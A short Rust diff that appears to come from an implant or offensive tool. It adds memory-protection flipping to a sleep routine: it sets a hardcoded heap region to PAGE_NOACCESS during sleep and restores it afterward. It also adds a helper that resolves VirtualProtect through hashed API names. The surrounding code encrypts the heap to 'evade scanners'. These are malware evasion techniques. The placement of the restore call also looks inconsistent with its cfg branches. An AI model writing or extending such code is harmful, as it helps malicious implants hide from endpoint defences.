@@ -8,6 +8,12 @@ pub fn sleep(ms: u64) {
     // Obfuscation: Encrypt heap memory to evade scanners during sleep
     encrypt_heap();
 
+    #[cfg(target_os = "windows")]
+    unsafe {
+        // Change heap to NOACCESS
+        set_memory_protection(0x10000000 as *mut u8, 1024 * 1024, 0x01); // PAGE_NOACCESS
+    }
+
     #[cfg(not(target_os = "windows"))]
     {
         let req = Timespec {
@@ -32,10 +38,26 @@ pub fn sleep(ms: u64) {
                 let sleep: SleepFn = core::mem::transmute(fn_sleep);
                 sleep(ms as u32);
             }
+
+            // Restore heap protection
+            set_memory_protection(0x10000000 as *mut u8, 1024 * 1024, 0x04); // PAGE_READWRITE
         }
     }
 
     decrypt_heap();
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn set_memory_protection(base: *mut u8, size: usize, protect: u32) {
+    let k32_hash = hash_str(b"KERNEL32.DLL");
+    let vp_hash = hash_str(b"VirtualProtect");
+    let fn_vp = resolve_function(k32_hash, vp_hash);
+    if !fn_vp.is_null() {
+        type VirtualProtectFn = unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
+        let virtual_protect: VirtualProtectFn = core::mem::transmute(fn_vp);
+        let mut old = 0;
+        virtual_protect(base, size, protect, &mut old);
+    }
 }
 
 pub fn encrypt_heap() {
